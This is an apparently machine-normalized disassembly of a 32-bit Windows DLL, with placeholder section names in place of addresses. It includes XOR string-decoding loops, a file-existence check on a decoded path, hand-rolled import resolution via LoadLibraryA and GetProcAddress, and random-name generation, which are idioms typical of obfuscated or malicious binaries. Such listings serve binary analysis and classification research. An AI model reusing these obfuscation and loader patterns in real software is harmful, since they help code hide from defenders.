mov eax [ ebp - 0xc ]
push [ eax - 0x1c ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_10057f0f
add esp 0xc
test eax eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebx + 0x68 ]
mov [ ebp - 0x14 ] eax
lea eax [ esi + 0x38 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x98 ] edi
push [ esi + 0x98 ]
push eax
push edi
call sub_10057f0f
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax + ecx ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_10057f0f
add esp 0xc
test eax eax
jne r-xdata
push edi
call sub_1007fa90
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x9c ] edi
push [ esi + 0x9c ]
push eax
push edi
call sub_10057f0f
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_1007fa90
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa0 ] edi
push [ esi + 0xa0 ]
push eax
push edi
call sub_10057f0f
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_1007fa90
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa4 ] edi
push [ esi + 0xa4 ]
push eax
push edi
call sub_10057f0f
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_1007fa90
lea eax [ edi + eax + 0x1 ]
mov ecx ebx
sub ecx eax
add ecx [ ebp - 0x8 ]
mov [ ebx + 0xa8 ] eax
push [ esi + 0xa8 ]
push ecx
push eax
call sub_10057f0f
add esp 0x10
test eax eax
jne r-xdata
sub_10017a20
push esi
mov esi [ ecx + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
pop esi
jmp edx
sub_10017a54
push 0x3c
mov eax sub_10085776
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100275d9
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1000bb8f
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10034a80
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_10017b50
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
cmp eax ecx
jae r-xdata
mov ebx [ ebp + 0x10 ]
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_1002d84e
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_1000831a
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ebx ]
cmp edi 0x7ffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1000831a
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10041880
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x8
cmp [ edx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
pop edi
mov ecx edx
mov ecx [ edx ]
jmp r-xdata
pop edi
mov eax esi
xor edx edx
pop esi
mov [ eax ] dx
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax ] dx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
lea edx [ ebx + ebx ]
push edx
mov edx [ ebp + 0xc ]
lea ecx [ ecx + edx * 2 ]
mov edx [ esi + 0x10 ]
push ecx
lea eax [ eax + edx * 2 ]
push eax
call sub_1007f5d0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10017c80
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
push eax
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov edx 0x7ffffffe
call sub_10072800
test eax eax
js r-xdata
sub_10017cc0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087ba9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] 0x1
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
mov edi [ esi + 0x10 ]
sub eax edx
sar eax 0x1
add eax [ ebx + 0x10 ]
cmp edi eax
ja r-xdata
mov edi [ ebp + 0xc ]
mov eax edi
lea edx [ eax + 0x2 ]
lea esp [ esp ]
cmp [ esi + 0x14 ] eax
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
mov ecx esi
call sub_10040ba0
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_10017b50
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x1
push eax
mov ecx esi
call sub_10070030
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_10017d97
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor edx edx
mov edx [ ecx + 0x30 ]
mov edx [ edx ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x18 ]
movzx eax ax
retn
mov eax [ eax ]
movzx eax [ eax ]
retn
test edx edx
jle r-xdata
sub_10017dc0
push ebp
mov ebp esp
sub esp 0xa8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x4c
and edx 0xff
mov [ ebp + eax * 2 - 0x58 ] dx
inc eax
cmp eax 0x28
jb r-xdata
push esi
mov esi [ GetFileAttributesW@IAT ]
lea ecx [ ebp - 0x58 ]
xor eax eax
push ecx
mov [ ebp - 0x8 ] ax
call esi
cmp eax 0xffffffff
je r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0x10
call sub_100367b0
push edx
call esi
xor ecx ecx
cmp eax 0xffffffff
setne cl
pop esi
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10017e70
push ebp
mov ebp esp
sub esp 0x8
mov ecx [ eax + 0x8 ]
push esi
mov esi [ ecx + 0x80 ]
mov eax [ esi + ebx + 0xc ]
add esi ebx
mov [ ebp - 0x4 ] esi
test eax eax
je r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push edi
jmp r-xdata
add eax ebx
push eax
call [ LoadLibraryA@IAT ]
mov edi [ esi ]
mov esi [ esi + 0x10 ]
add edi ebx
mov ecx eax
mov eax [ edi ]
add esi ebx
mov [ ebp - 0x8 ] ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x4 ] eax
mov eax [ eax + 0xc ]
test eax eax
jne r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
pop edi
add eax ebx
jns r-xdata
add eax 0x2
and eax 0xffff
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push eax
push ecx
call [ GetProcAddress@IAT ]
add edi 0x4
mov [ esi ] eax
mov eax [ edi ]
add esi 0x4
test eax eax
jne r-xdata
sub_10017f00
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
mov eax ebx
push edi
mov [ ebp - 0x8 ] esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea edi [ eax + 0x1 ]
mov [ ebp - 0x10 ] edi
cmp edi esi
jbe r-xdata
inc esi
xor ecx ecx
mov eax esi
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1001df01
add esp 0x4
mov ebx eax
mov edi ebx
mov [ ebp - 0xc ] 0x0
test esi esi
je r-xdata
lea esp [ esp ]
xor ecx ecx
mov [ edi ] cx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
lea esp [ esp ]
add ebx eax
inc esi
sub edi eax
jne r-xdata
add [ ebp + 0x8 ] eax
add edi 0x2
dec esi
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
push edi
lea edx [ ebp - 0x4 ]
push ebx
push edx
call sub_10026eb0
add esp 0x14
test eax eax
jle r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0xc ]
push ecx
push edx
push eax
push edi
call sub_10026eb0
add esp 0x14
test eax eax
jle r-xdata
sub_10017fc0
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push ebx
xor ebx ebx
push esi
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0x8c ] ebx
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa5
and edx 0xff
mov [ ebp + eax * 2 - 0x40 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x8c ]
push edx
mov [ ebp - 0x26 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x40 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
cmp [ edi + 0x54 ] 0x8
lea eax [ edi + 0x40 ]
jb r-xdata
mov ecx 0x3
lea edx [ ebp - 0x24 ]
mov eax 0xb9
mov [ ebp - 0x14 ] cx
lea esi [ ecx - 0x2 ]
call sub_10053240
mov ebx [ ebp - 0x14 ]
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
lea eax [ ebp - 0x8c ]
push eax
push r--data
lea eax [ ebp - 0x24 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x8 ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] esi
call ecx
test eax eax
je r-xdata
push eax
call [ SysAllocString@IAT ]
mov esi eax
mov eax [ ebp - 0x8c ]
mov edx [ eax ]
push esi
push eax
mov eax [ edx + 0x6c ]
call eax
lea edx [ ebp - 0x10 ]
mov eax 0x1e
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x90 ] ebx
call sub_10053240
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x94 ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ eax ]
xor ebx ebx
lea edx [ ebp - 0x78 ]
mov eax 0xaf
call sub_10053240
mov esi 0x1
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x94 ]
mov ecx [ eax ]
lea edx [ ebp - 0x90 ]
push edx
mov edx [ ebp - 0x8c ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0x90 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0xe9
call sub_10053240
mov [ ebp - 0x98 ] 0x2
jmp r-xdata
mov eax [ ebp - 0x8c ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x35
call sub_10053240
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x90 ] ebx
jmp r-xdata
push esi
call [ SysFreeString@IAT ]
mov esi [ ebp - 0x98 ]
mov ecx [ ebp - 0x4 ]
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x94 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_100181a0
push ebp
mov ebp esp
mov edx [ rw-data ]
mov eax [ edx + 0x10 ]
push esi
mov esi [ edx + 0xc ]
cmp esi eax
je r-xdata
or eax 0xffffffff
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
cmp esi eax
jne r-xdata
add esi 0x8
cmp esi eax
jne r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
cmp ecx eax
ja r-xdata
cmp [ esi ] ecx
je r-xdata
push ebx
push edi
mov edi [ ebp + 0x10 ]
lea ebx [ ecx + edi ]
cmp ebx eax
jb r-xdata
mov eax [ edx ]
add eax ecx
mov ecx [ ebp + 0xc ]
push edi
push eax
push ecx
call sub_1007f5d0
add esp 0xc
add [ esi + 0x4 ] edi
mov eax edi
pop edi
pop ebx
pop esi
pop ebp
retn
sub eax ecx
mov edi eax
sub_10018233
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_10018280
push ebp
mov ebp esp
mov eax [ esi ]
push edi
mov edi [ GetProcessHeap@IAT ]
test eax eax
jne r-xdata
mov edx [ esi + 0x4 ]
lea ecx [ edx * 4 + 0x4 ]
push ecx
push eax
push 0x8
call edi
push eax
call [ HeapReAlloc@IAT ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
lea ecx [ eax * 4 + 0x4 ]
push ecx
push 0x8
call edi
push eax
call [ HeapAlloc@IAT ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov [ esi ] eax
mov eax 0x2
pop edi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ lstrlenW@IAT ]
push edx
call ebx
lea eax [ eax + eax + 0x2 ]
push eax
push 0x8
call edi
push eax
call [ HeapAlloc@IAT ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov [ edx + ecx * 4 ] eax
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
cmp [ ecx + eax * 4 ] 0x0
jne r-xdata
mov eax 0x1
pop edi
pop ebp
retn 0x4
mov edi [ ebp + 0x8 ]
push edi
call ebx
mov edx [ esi + 0x4 ]
add eax eax
push eax
mov eax [ esi ]
mov ecx [ eax + edx * 4 ]
push edi
push ecx
call sub_1007f5d0
inc [ esi + 0x4 ]
add esp 0xc
pop ebx
xor eax eax
pop edi
pop ebp
retn 0x4
pop ebx
mov eax 0x3
pop edi
pop ebp
retn 0x4
sub_10018340
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov edx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x20 ]
push ecx
push edx
push eax
push r--data
lea eax [ esp + 0x20 ]
push eax
push esi
call sub_10069d50
add esp 0x10
push eax
lea ecx [ esp + 0x24 ]
push 0x40
push ecx
call sub_1005c1c5
mov ecx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x18 ]
lea edx [ esp + 0x30 ]
push edx
mov edx [ ebp + 0xc ]
push eax
push ebx
push ecx
push edx
push edi
push esi
call sub_100149a0
mov ecx [ esp + 0x90 ]
add esp 0x34
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x1c
sub_100183d0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ecx ecx
mov eax edi
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1001df01
dec edi
add esp 0x4
xor esi esi
mov ebx eax
test edi edi
jle r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor edx edx
mov [ ebx + eax * 2 - 0x2 ] dx
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
lea ecx [ ecx ]
call sub_1001cd91
xor edx edx
mov ecx 0x1a
div ecx
inc esi
add edx 0x61
mov [ ebx + esi * 2 - 0x2 ] dx
cmp esi edi
jl r-xdata
sub_1001842e
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000bb10
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_100184d0
push ebp
mov ebp esp
sub esp 0x8
mov al [ ebp + 0x8 ]
add ecx 0x18
push ecx
lea ecx [ ebp - 0x8 ]
push ecx
push 0x1
lea edx [ ebp + 0x8 ]
mov [ ebp + 0x8 ] al
push edx
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x8 ] 0x0
call sub_10026eb0
add esp 0x14
test eax eax
mov eax 0xffff
js r-xdata
mov esp ebp
pop ebp
retn 0x4
movzx eax [ ebp - 0x4 ]
sub_10018510
push esi
mov esi [ ebx ]
test esi esi
je r-xdata
xor eax eax
mov [ ebx ] eax
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] eax
pop esi
retn
push edi
mov edi [ ebx + 0x4 ]
cmp esi edi
je r-xdata
mov eax [ ebx ]
push eax
call sub_100187af
add esp 0x4
pop edi
nop
call sub_1002fbb0
sub esi 0xffffff80
cmp esi edi
jne r-xdata
sub_10018550
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
xor eax eax
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] ax
call sub_100649e0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10018580
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x1ffffff
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10069ac6
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10024fe9
shl ecx 0x7
push ecx
call sub_1001f84c
add esp 0x4
test eax eax
jne r-xdata
sub_100185d0
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
mov ecx [ r--data ]
xor eax eax
push ebx
nop
movsx ebx [ ecx + eax ]
xor ebx eax
xor ebx 0xffd8
and ebx 0xff
mov [ ebp + eax * 2 - 0x10 ] bx
inc eax
cmp eax 0x4
jb r-xdata
push edx
lea ecx [ ebp - 0x10 ]
xor eax eax
push ecx
mov [ ebp - 0x8 ] ax
call sub_100724e0
add esp 0x8
pop ebx
test eax eax
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x1f
call sub_10053240
push edi
push edx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x7c ]
mov eax 0xb6
call sub_10053240
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x80 ]
mov eax 0x74
call sub_10053240
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_100186a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x20
sub_100186c6
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x1
je r-xdata
call sub_1006299d
mov [ eax ] 0x21
jle r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x3
jg r-xdata
call sub_1006299d
mov [ eax ] 0x22
pop ebp
retn
sub_10018710
push ebp
mov ebp esp
push esi
push edi
push 0x324
push 0x0
push ebx
call sub_1007f940
mov esi [ ebp + 0xc ]
lea edi [ ebx + 0x122 ]
mov ecx 0x40
[ edi ] [ esi ]
mov edi [ ebp + 0x10 ]
mov eax edi
add esp 0xc
lea esi [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
mov esi [ ebp + 0x8 ]
push eax
add esi 0x20
push edi
mov ecx esi
call sub_10037e00
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] eax
mov ax [ ebp + 0x14 ]
mov edi 0x1
mov [ ebx ] 0x7fffffff
mov [ ebx + 0x4 ] 0x7fffffff
mov [ ebx + 0x14 ] edi
mov [ ebx + 0x18 ] edi
mov [ ebx + 0x20 ] ax
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push edi
push esi
lea edx [ ebx + 0x122 ]
call sub_100247f0
mov ecx [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
add esp 0x8
mov eax edi
pop edi
mov [ edx + 0x380 ] ecx
pop esi
pop ebp
retn 0x10
mov esi [ esi ]
sub_100187c9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
call sub_1000ff00
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_100187ea
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x14 ]
push eax
push 0x0
push 0x3a
call sub_100578b0
mov ebx [ ebp + 0x24 ]
movzx eax ax
mov [ ebp - 0x4 ] eax
lea eax [ ebx + 0x8 ]
push eax
push 0x17
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001b303
mov esi [ ebp + 0x20 ]
add esp 0x24
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov ax [ ebp - 0x4 ]
cmp [ ebp + 0x12 ] ax
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
lea ecx [ ebp + 0xc ]
call sub_1005a5dc
lea eax [ ebx + 0x4 ]
push eax
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001b303
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005a5dc
push ebx
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001b303
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_100188c2
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10059cc0
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_1001895f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x44 ]
